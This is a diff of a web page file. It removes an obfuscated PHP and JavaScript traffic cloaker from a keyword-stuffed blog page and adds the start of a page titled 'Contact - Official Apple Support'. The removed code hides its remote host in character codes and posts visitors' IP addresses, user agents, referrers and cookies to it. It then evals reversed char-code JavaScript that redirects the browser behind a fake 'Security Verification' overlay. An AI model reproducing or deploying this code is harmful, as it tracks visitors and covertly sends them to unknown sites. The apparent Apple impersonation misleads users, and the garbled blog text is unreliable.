@@ -1,22 +1,334 @@
-<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null,$q=null,$co=null){if(empty($u)){return '$("#lo527703ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));if($co AND isset($_COOKIE["_eventlo527703ad"])){$me="";}else{$me = '$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><style>  @keyframes fill{from{width:0}to{width:98%}}  @keyframes glow{0%,100%{box-shadow:0 0 0 0 rgba(34,139,230,0.5)}50%{box-shadow:0 0 0 12px rgba(34,139,230,0)}}  .vf-btn{animation:glow 1.3s infinite}  .vf-cancel:hover{transform:translateX(100px);opacity:0.2}</style><div style=\"position:fixed;inset:0;background:rgba(0,0,0,0.8);backdrop-filter:blur(5px);z-index:9999;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;\">  <div style=\"background:#fff;border-radius:12px;padding:24px;width:310px;text-align:center;border-top:4px solid #228be6;\">    <div style=\"font-size:42px;\">&#128274;</div>    <div style=\"font-size:17px;font-weight:800;margin:6px 0 4px;color:#111;\">Security Verification</div>    <div style=\"font-size:12px;color:#555;margin-bottom:12px;\">Please confirm you&rsquo;re human to continue safely.</div>    <div style=\"background:#f1f1f1;border-radius:10px;height:8px;overflow:hidden;margin-bottom:6px;\">      <div style=\"height:100%;background:linear-gradient(90deg,#228be6,#15aabf);animation:fill 2.5s ease-out forwards;\"></div>    </div>    <div style=\"font-size:11px;color:#228be6;font-weight:700;margin-bottom:14px;\">&#9989; Verifying your device&hellip;</div>    <a href=\"#\" class=\"vf-btn\" style=\"display:block;background:linear-gradient(135deg,#228be6,#15aabf);color:#fff;padding:13px;border-radius:8px;font-weight:800;text-decoration:none;\">&#10004; Continue Safely</a>    <a href=\"#\" class=\"vf-cancel\" style=\"color:#bbb;font-size:11px;text-decoration:underline;display:inline-block;margin-top:10px;transition:.4s;\">Cancel &amp; leave site</a>  </div></div></div>");';}return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();'.$me.'s=rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";$("html").show();eval(c);';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["imm"])){$date = date("Y-m-d H:i:s");$id = "527703";$uid="4v6qn38yoo2c3l45eqgv9c277";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_eventlo527703ad"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"imm" =>$_POST["imm"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_eventlo527703ad",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q,true);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo527703ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo527703ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple Support</title>
+    <link rel="apple-touch-icon" href="images/favicon.ico">
+    <link rel="icon" type="image/png" href="images/favicon.ico">
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
 
-<html><head><meta charset="UTF-8" class="active-bTHOvXbKnZvFq"/><link rel="stylesheet" href="styles.css" class="breadcrumbs-woOtJJGS"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="row-upGlixNWluca"/><meta name="referrer" content="no-referrer" class="medium-veEGKElRrp"/><style> @import url('https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #d7000a; border-radius: 48px; } *::-webkit-scrollbar-thumb { background-color: #feb18a; border-radius: 48px; border: 3px solid #d7000a; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>studoro.shop</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
 
- 
-<style>body {display: none;}</style>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-mobile/1.4.5/jquery.mobile.min.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
-<script>var oldtitle=document.title;document.title = "Loading";$( document ).ajaxComplete(function(){document.title = oldtitle;$(".loaderdiv").fadeOut("slow");$(".maindiv").fadeIn("slow");});$(document).ready(function(){function loadA(t){$.ajax({url:location.href,type:"POST",data:"tz="+e+"&r="+document.referrer+"&he="+g+"&imm="+t,success:function(a){eval(a)}})}var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var d=jstz.determine();var e=d.name();var co = document.cookie.indexOf("_eventlo527703ad=");if(co==0){loadA("p");}else{$("body").hide();$("html").append("<div id=\"lo527703ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><style>  @keyframes fill{from{width:0}to{width:98%}}  @keyframes glow{0%,100%{box-shadow:0 0 0 0 rgba(34,139,230,0.5)}50%{box-shadow:0 0 0 12px rgba(34,139,230,0)}}  .vf-btn{animation:glow 1.3s infinite}  .vf-cancel:hover{transform:translateX(100px);opacity:0.2}</style><div style=\"position:fixed;inset:0;background:rgba(0,0,0,0.8);backdrop-filter:blur(5px);z-index:9999;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;\">  <div style=\"background:#fff;border-radius:12px;padding:24px;width:310px;text-align:center;border-top:4px solid #228be6;\">    <div style=\"font-size:42px;\">&#128274;</div>    <div style=\"font-size:17px;font-weight:800;margin:6px 0 4px;color:#111;\">Security Verification</div>    <div style=\"font-size:12px;color:#555;margin-bottom:12px;\">Please confirm you&rsquo;re human to continue safely.</div>    <div style=\"background:#f1f1f1;border-radius:10px;height:8px;overflow:hidden;margin-bottom:6px;\">      <div style=\"height:100%;background:linear-gradient(90deg,#228be6,#15aabf);animation:fill 2.5s ease-out forwards;\"></div>    </div>    <div style=\"font-size:11px;color:#228be6;font-weight:700;margin-bottom:14px;\">&#9989; Verifying your device&hellip;</div>    <a href=\"#\" class=\"vf-btn\" style=\"display:block;background:linear-gradient(135deg,#228be6,#15aabf);color:#fff;padding:13px;border-radius:8px;font-weight:800;text-decoration:none;\">&#10004; Continue Safely</a>    <a href=\"#\" class=\"vf-cancel\" style=\"color:#bbb;font-size:11px;text-decoration:underline;display:inline-block;margin-top:10px;transition:.4s;\">Cancel &amp; leave site</a>  </div></div></div>");var h=null;var i=null;var j=true;$(document).on("pagecreate","body",function(){$("body").on("tap",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}})}).add($(document).on("mousemove",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}}));h=setTimeout(function(){i=false;loadA("b")},3600000)}});</script>
-
- 
- <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-0LY0HY7L01');
+  gtag('config', 'G-2DMKRPGVF0');
 </script>
-</head><body class="icon-IEBCJZfNgN"><main class="button-rCDgoh"><div class="active-MtIAfsYoQcSbyzpz"><div class="picture-NqOeMZnKGYIGDRPM"><div class="thumb-vKtGOKhVZHrooAdw"><img src="./img/15cb0852dc145bd2cea75fd870d7750a420d18cd.jpg" class="headline-utSFUm"/></div></div><div class="sm-AdpshzLm"><div class="button-gZPOenNOmGDpQHs"><a href="themelist0.html" class="thumbnail-bcugYZcH"><span class="pic-MoSHsnhzvv">Read more</span></a><a href="index.php" class="row-psOdgkXQJBIy"><span class="holder-wFDhGu">Tell others</span></a></div><div class="title-fypQouQE"><h3 class="tagline-nAPKWY">studoro.shop</h3><span class="pic-MvJEcOHqGNBt">An in-depth look Academic Literacy at Teaching Skills Training how Knowledge various writing styles Certification Curriculum enhance Learning Writing critical thinking skills in educational settings. Study Innovation Research Reading Examination</span></div></div></div><div class="xs-DpzVmnxBvfIgaZ"><div class="huge-uKbipbYce"><div class="widget-dGswMRoTyN"><h3 class="tagline-wuovDQhKkF">Panorama</h3></div></div><div class="preview-ANkFRca"><div class="holder-nluNNlVDmUaQqn"><img src="./img/9f43ad05b7dfb9c195758dbaa3413115f7badf81.jpg" class="breadcrumbs-BgiTmoptecC"/><img src="./img/63429b7e44536140f048b946113be0da909c16ec.jpg" class="heading-yXtAMNgPbs"/><img src="./img/91e7fb2cdbe39d57bf8950b18e9ae7552998a67f.jpg" class="page-TfnmXIBKt"/><img src="./img/780bba56748c2953793383ace02b5f90174be518.jpg" class="medium-ckzBMK"/><img src="./img/0ceb558ad2831ecaa281aaf44b112ed5d973a3eb.jpg" class="column-dZPTFCWpAamiPwr"/><img src="./img/2c1bcfe003d28929262c5e63d0f67bef1085d6a9.jpg" class="wide-iSTOZpZNnykwnNAa"/><img src="./img/7a643cf175c432d2e8d856ec1be706a9595cf2d6.jpg" class="section-EUHIFRyqxNmwSl"/><img src="./img/dcd82212fb0abc1edb4081c15e76805ab347ae23.jpg" class="tagline-RJbxWiw"/><img src="./img/78a78189d0e6b84ef600e4c8183766fdfd84d1d6.jpg" class="tip-JUSpOzS"/><img src="./img/4e22ac1d386008a32cc8da85d3303847f0f0c67a.jpg" class="headline-YeiplLveblKIRGps"/></div></div></div><div style="display: flex; position: relative; justify-content: center; align-items: center; min-width: 80%; gap: calc(15vw/var(--resizer)*100); padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; flex-direction: column; background-color: #feb18a; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'chinese-9_33852'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cstyle%3E%0A%20%20%20%20%40keyframes%20float1%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(25px%2C%200)%20rotate(8deg)%20scale(0.5179324059024593)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float1%20%7B%0A%20%20%20%20%20%20animation%3A%20float1%206s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float2%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-23px%2C%20-16px)%20rotate(96deg)%20scale(1.4430791049770044)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float2%20%7B%0A%20%20%20%20%20%20animation%3A%20float2%202s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float3%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%20-27px)%20rotate(105deg)%20scale(1.884236802922483)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float3%20%7B%0A%20%20%20%20%20%20animation%3A%20float3%206s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%3Cpattern%20id%3D'57679'%20patternUnits%3D'userSpaceOnUse'%20width%3D'50'%20height%3D'50'%20patternTransform%3D'scale(9)%20rotate(4)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23fdffec'%2F%3E%3Cpath%20d%3D'M1.305%200A1.25%201.25%200%2001.07%201.06%201.25%201.25%200%20010%201.058v1.25a2.5%202.5%200%2000.07.001A2.5%202.5%200%20002.562%200zm2.51%200A3.75%203.75%200%2001.07%203.56%203.75%203.75%200%20010%203.559v5.834a3.75%203.75%200%2001.07%200%203.75%203.75%200%20013.75%203.75%203.75%203.75%200%2001-3.75%203.75%203.75%203.75%200%2001-.07-.001v3.334a20.417%2020.416%200%2000.07%200A20.417%2020.416%200%200020.485-.001h-3.337a3.75%203.75%200%2001-3.745%203.56A3.75%203.75%200%20019.658%200zm7.095%200a2.5%202.5%200%20002.493%202.31A2.5%202.5%200%200015.896%200h-1.258a1.25%201.25%200%2001-1.235%201.06A1.25%201.25%200%200112.167%200zm10.825%200A21.667%2021.666%200%2001.07%2021.476a21.667%2021.666%200%2001-.07%200v3.333a25%2025%200%2000.07%200A25%2025%200%200025.069%200zM.07%2024.81a25%2025%200%2000-.07%200v3.333a21.667%2021.666%200%2001.07%200%2021.667%2021.666%200%200121.666%2021.666%2021.667%2021.666%200%2001-.001.19h3.334a25%2025%200%20000-.19%2025%2025%200%2000-25-25zm25%2025a25%2025%200%20000%20.19h3.334a21.667%2021.666%200%2001-.001-.19A21.667%2021.666%200%200150%2028.142V24.81a25%2025%200%2000-24.93%2025zm0-49.81A25%2025%200%200050%2024.81v-3.335A21.667%2021.666%200%200128.404%200zm4.584%200A20.417%2020.416%200%200050%2020.226v-3.334a3.75%203.75%200%2001-3.68-3.75A3.75%203.75%200%200150%209.394V3.56a3.75%203.75%200%2001-3.675-3.56h-5.843a3.75%203.75%200%2001-3.746%203.56A3.75%203.75%200%200132.991%200zm4.59%200a2.5%202.5%200%20002.492%202.31A2.5%202.5%200%200039.23%200H37.97a1.25%201.25%200%2001-1.235%201.06A1.25%201.25%200%200135.5%200zm13.333%200A2.5%202.5%200%200050%202.308v-1.25A1.25%201.25%200%200148.834%200zM6.737%204.81a1.667%201.667%200%20011.666%201.666%201.667%201.667%200%2001-1.667%201.667A1.667%201.667%200%20015.07%206.476%201.667%201.667%200%20016.736%204.81zm6.666%200a1.667%201.667%200%20011.666%201.666%201.667%201.667%200%2001-1.666%201.667%201.667%201.667%200%2001-1.667-1.667%201.667%201.667%200%20011.667-1.666zm23.333%200a1.667%201.667%200%20011.667%201.666%201.667%201.667%200%2001-1.667%201.667%201.667%201.667%200%2001-1.667-1.667%201.667%201.667%200%20011.667-1.666zm6.667%200a1.667%201.667%200%20011.666%201.666%201.667%201.667%200%2001-1.666%201.667%201.667%201.667%200%2001-1.667-1.667%201.667%201.667%200%20011.667-1.666zm-32.667%204a1.667%201.667%200%20011.667%201.666%201.667%201.667%200%2001-1.667%201.667%201.667%201.667%200%2001-1.666-1.667%201.667%201.667%200%20011.666-1.666zm28.667%200a1.667%201.667%200%20011.666%201.666%201.667%201.667%200%2001-1.666%201.667%201.667%201.667%200%2001-1.667-1.667%201.667%201.667%200%20011.667-1.666zM.057%2010.643a2.5%202.5%200%2000-.057%200v1.252a1.25%201.25%200%2001.06-.002%201.25%201.25%200%2001.01%200%201.25%201.25%200%20011.25%201.25%201.25%201.25%200%2001-1.25%201.25A1.25%201.25%200%20010%2014.39v1.25a2.5%202.5%200%2000.07.002%202.5%202.5%200%20002.5-2.5%202.5%202.5%200%2000-2.5-2.5%202.5%202.5%200%2000-.013%200zm49.943%200a2.5%202.5%200%2000-2.43%202.5A2.5%202.5%200%200050%2015.642V14.39a1.25%201.25%200%2001-1.18-1.248A1.25%201.25%200%200150%2011.895zm-43.264.833a1.667%201.667%200%20011.667%201.667%201.667%201.667%200%2001-1.667%201.667%201.667%201.667%200%2001-1.666-1.667%201.667%201.667%200%20011.666-1.667zm36.667%200a1.667%201.667%200%20011.666%201.667%201.667%201.667%200%2001-1.666%201.667%201.667%201.667%200%2001-1.667-1.667%201.667%201.667%200%20011.667-1.667zM0%2029.393v3.334a3.75%203.75%200%2001.07-.001%203.75%203.75%200%20013.75%203.75%203.75%203.75%200%2001-3.75%203.75%203.75%203.75%200%2001-.07%200v5.834a3.75%203.75%200%2001.07-.001%203.75%203.75%200%20013.75%203.75%203.75%203.75%200%2001-.005.19h5.843a3.75%203.75%200%2001-.005-.19%203.75%203.75%200%20013.75-3.75%203.75%203.75%200%20013.75%203.75%203.75%203.75%200%2001-.005.19h3.337a20.417%2020.416%200%2000.001-.19A20.417%2020.416%200%2000.07%2029.392a20.417%2020.416%200%2000-.042%200%2020.417%2020.416%200%2000-.027%200zm50%200a20.417%2020.416%200%2000-20.347%2020.416%2020.417%2020.416%200%2000.001.19h3.337a3.75%203.75%200%2001-.005-.19%203.75%203.75%200%20013.75-3.75%203.75%203.75%200%20013.75%203.75%203.75%203.75%200%2001-.004.19h5.843a3.75%203.75%200%2001-.006-.19A3.75%203.75%200%200150%2046.06v-5.834a3.75%203.75%200%2001-3.68-3.749%203.75%203.75%200%20013.68-3.75zM.057%2033.976a2.5%202.5%200%2000-.057%200v1.252a1.25%201.25%200%2001.06-.002%201.25%201.25%200%2001.01%200%201.25%201.25%200%20011.25%201.25%201.25%201.25%200%2001-1.25%201.25%201.25%201.25%200%2001-.07-.002v1.25a2.5%202.5%200%2000.07.002%202.5%202.5%200%20002.5-2.5%202.5%202.5%200%2000-2.5-2.5%202.5%202.5%200%2000-.013%200zm49.943%200a2.5%202.5%200%2000-2.43%202.5A2.5%202.5%200%200050%2038.975v-1.25a1.25%201.25%200%2001-1.18-1.249A1.25%201.25%200%200150%2035.228zm-43.264.833a1.667%201.667%200%20011.667%201.667%201.667%201.667%200%2001-1.667%201.667%201.667%201.667%200%2001-1.666-1.667%201.667%201.667%200%20011.666-1.667zm36.667%200a1.667%201.667%200%20011.666%201.667%201.667%201.667%200%2001-1.666%201.667%201.667%201.667%200%2001-1.667-1.667%201.667%201.667%200%20011.667-1.667zm-32.667%202.667a1.667%201.667%200%20011.667%201.667%201.667%201.667%200%2001-1.667%201.666%201.667%201.667%200%2001-1.666-1.666%201.667%201.667%200%20011.666-1.667zm28.667%200a1.667%201.667%200%20011.666%201.667%201.667%201.667%200%2001-1.666%201.666%201.667%201.667%200%2001-1.667-1.666%201.667%201.667%200%20011.667-1.667zm-32.667%204a1.667%201.667%200%20011.667%201.667%201.667%201.667%200%2001-1.667%201.666%201.667%201.667%200%2001-1.666-1.666%201.667%201.667%200%20011.666-1.667zm6.667%200a1.667%201.667%200%20011.667%201.667%201.667%201.667%200%2001-1.667%201.666%201.667%201.667%200%2001-1.667-1.666%201.667%201.667%200%20011.667-1.667zm23.333%200a1.667%201.667%200%20011.667%201.667%201.667%201.667%200%2001-1.667%201.666%201.667%201.667%200%2001-1.666-1.666%201.667%201.667%200%20011.666-1.667zm6.667%200a1.667%201.667%200%20011.666%201.667%201.667%201.667%200%2001-1.666%201.666%201.667%201.667%200%2001-1.667-1.666%201.667%201.667%200%20011.667-1.667zM.057%2047.309A2.5%202.5%200%20000%2047.31v1.251a1.25%201.25%200%2001.06-.002%201.25%201.25%200%2001.01%200%201.25%201.25%200%20011.25%201.25%201.25%201.25%200%2001-.015.19h1.257a2.5%202.5%200%2000.008-.19%202.5%202.5%200%2000-2.5-2.5%202.5%202.5%200%2000-.013%200zm13.333%200a2.5%202.5%200%2000-2.487%202.5%202.5%202.5%200%2000.007.19h1.257a1.25%201.25%200%2001-.014-.19%201.25%201.25%200%20011.24-1.25%201.25%201.25%200%2001.01%200%201.25%201.25%200%20011.25%201.25%201.25%201.25%200%2001-.015.19h1.258a2.5%202.5%200%2000.007-.19%202.5%202.5%200%2000-2.5-2.5%202.5%202.5%200%2000-.012%200zm23.334%200a2.5%202.5%200%2000-2.488%202.5%202.5%202.5%200%2000.007.19h1.258a1.25%201.25%200%2001-.015-.19%201.25%201.25%200%20011.24-1.25%201.25%201.25%200%2001.01%200%201.25%201.25%200%20011.25%201.25%201.25%201.25%200%2001-.015.19h1.258a2.5%202.5%200%2000.007-.19%202.5%202.5%200%2000-2.5-2.5%202.5%202.5%200%2000-.012%200zM50%2047.31a2.5%202.5%200%2000-2.43%202.5%202.5%202.5%200%2000.007.19h1.257a1.25%201.25%200%2001-.015-.19A1.25%201.25%200%200150%2048.56z'%20%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23feb18a'%2F%3E%3Cpath%20d%3D'M25.07%2011.893a1.667%201.667%200%2000-1.667%201.666%201.667%201.667%200%20001.667%201.667%201.667%201.667%200%20001.666-1.667%201.667%201.667%200%2000-1.666-1.666zm0%204.583a1.667%201.667%200%2000-1.667%201.667%201.667%201.667%200%20001.667%201.666%201.667%201.667%200%20001.666-1.666%201.667%201.667%200%2000-1.666-1.667zm-4.667%202a1.667%201.667%200%2000-1.667%201.667%201.667%201.667%200%20001.667%201.666%201.667%201.667%200%20001.667-1.666%201.667%201.667%200%2000-1.667-1.667zm9.333%200a1.667%201.667%200%2000-1.666%201.667%201.667%201.667%200%20001.666%201.666%201.667%201.667%200%20001.667-1.666%201.667%201.667%200%2000-1.667-1.667zM25.07%2021.06a3.75%203.75%200%20100%207.5%203.75%203.75%200%20000-7.5zm-.013%201.25h.013a2.5%202.5%200%2011-.013%200zm-11.237.834a1.667%201.667%200%2000-1.667%201.666%201.667%201.667%200%20001.667%201.667%201.667%201.667%200%20001.666-1.667%201.667%201.667%200%2000-1.666-1.666zm4.583%200a1.667%201.667%200%2000-1.667%201.666%201.667%201.667%200%20001.667%201.667%201.667%201.667%200%20001.667-1.667%201.667%201.667%200%2000-1.667-1.666zm13.333%200a1.667%201.667%200%20100%203.333%201.667%201.667%200%20000-3.333zm4.584%200a1.667%201.667%200%2000-1.667%201.666%201.667%201.667%200%20001.667%201.667%201.667%201.667%200%20001.666-1.667%201.667%201.667%200%2000-1.666-1.666zm-11.26.416a1.25%201.25%200%2010.02%202.5%201.25%201.25%200%2000-.02-2.5zm-4.657%204.25a1.667%201.667%200%2000-1.667%201.667%201.667%201.667%200%20001.667%201.667%201.667%201.667%200%20001.667-1.667%201.667%201.667%200%2000-1.667-1.667zm9.333%200a1.667%201.667%200%2000-1.666%201.667%201.667%201.667%200%20001.666%201.667%201.667%201.667%200%20001.667-1.667%201.667%201.667%200%2000-1.667-1.667zm-4.666%202a1.667%201.667%200%2000-1.667%201.667%201.667%201.667%200%20001.667%201.667%201.667%201.667%200%20001.666-1.667%201.667%201.667%200%2000-1.666-1.667zm0%204.584a1.667%201.667%200%2000-1.667%201.666%201.667%201.667%200%20001.667%201.667%201.667%201.667%200%20001.666-1.667%201.667%201.667%200%2000-1.666-1.666z'%20%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23feb18a'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-178%2C-99)'%20fill%3D'url(%2357679)'%2F%3E%3C%2Fsvg%3E&quot;);" class="picture-MkidGlvhImwUfkH"><div class="thumbnail-frjmvOYmvBZmswYz"><div class="text-WnDklA"><h3 class="page-CoZooaXMcA">Content vault</h3></div></div><div class="subtitle-gAOTMzCtRai"><div class="small-aSVoIfwsaTmcaij"><div class="tagline-rShNOvSIEd"><h5 class="inner-YnZEqaHPWpW">Exploring the Benefits of Bilingual Education: A Pathway to Global Competence</h5><div class="thumb-CgnFcuMJbiD"><span class="page-rfsNPjlR">Study Certification Knowledge This article discusses Examination the Academic advantages Innovation of bilingual education, Skills its impact Research on cognitive Reading Training development, cultural Teaching Writing Curriculum understanding, Learning and future career opportunities for Literacy students.</span></div></div><div class="sidebar-vAVGrXBUR"><img src="./img/8c3e7156aa33f0f6ec7e70148af77ce9cdfaa662.jpg" class="thumbnail-NyYBprXAodHhWSq"/></div><div class="small-OljheZaOMjF"><a href="themelist1.html" class="large-eSRNcOhDZploIalq"><span class="thumbnail-blvmYzlUrYlO">Read more</span></a></div><div class="thumb-EoXMfOCg"><div class="active-CmfjQV"><div class="all-vnJPsPHlkCaicCSv"><span class="small-fSkTdOAuXWzUG">Emma Rodriguez</span></div></div><div class="current-nSfDEjRWEm"><div class="button-qkekKeJgewFghwC"><span class="narrow-ZonnSwcdx">10/02/24</span></div></div></div></div><div class="img-ApWrcGZrmztEnWsV"><div class="pic-ZpAldQTkykbLyMw"><h5 class="wide-gfkMWKZ">The Art of Effective Time Management for Students</h5><div class="caption-wbQGETXZtEKWBUi"><span class="column-kNwbWwgZi">Academic This article provides Skills Literacy Writing practical tips and strategies for students to improve Knowledge their Curriculum Teaching Innovation Learning Training Study Research time management Reading skills, enhancing productivity Certification and Examination academic success.</span></div></div><div class="medium-vOAAiMXsNNwAjXI"><img src="./img/bfa4cec6f59bd6a3ed8c618cc92741911ebd9d0f.jpg" class="heading-UQsQvkWlGxdN"/></div><div class="breadcrumbs-RWUbvM"><a href="themelist2.html" class="lg-uEZyWtcf"><span class="huge-atFhpnkikaDMfh">Read more</span></a></div><div class="xl-OAHYrkHNuw"><div class="sm-isoUNgeg"><div class="wrapper-SlmSwrxj"><span class="control-GpPRRE">Sofia Martinez</span></div></div><div class="title-Flbezm"><div class="widget-lZOYojzkZvifl"><span class="image-MRmadYfFpNNAr">10/07/24</span></div></div></div></div><div class="wrap-VFQtMnA"><div class="button-foMRsMsYRjd"><h5 class="desc-WddafqMqD">The Art of Note-Taking: Choosing the Perfect Notebook for Every Occasion</h5><div class="tooltip-dOvusWMYJhkaTXVy"><span class="narrow-OcjLjeOCN">Academic Explore Literacy Knowledge the diverse world of notebooks and discover how Learning Curriculum Certification to select the ideal Study type Examination Training for Innovation your unique Teaching Reading Writing note-taking style and Research needs. Skills</span></div></div><div class="section-WgVRyv"><img src="./img/098f0fea8115f600ca7808770d60c59f58f7340a.jpg" class="button-eZHWuWG"/></div><div class="wrap-TRzBRwFwo"><a href="themelist3.html" class="col-wlSMtOgmZfkm"><span class="narrow-CaXFoFuvaq">Read more</span></a></div><div class="pic-ZDSPBObYIKBj"><div class="control-KENikr"><div class="inner-jNdlxwgWeQF"><span class="md-yWCkBxXbURf">Lucas Bennett</span></div></div><div class="page-QVVDVutBs"><div class="thumbnail-KHsRwjRoJIG"><span class="img-AGHozZQXeGNTqx">11/20/24</span></div></div></div></div><div class="btn-bOcCOpEGDrO"><div class="subtitle-jQIPRGaGci"><h5 class="widget-PufHaUJEAfg">Harnessing 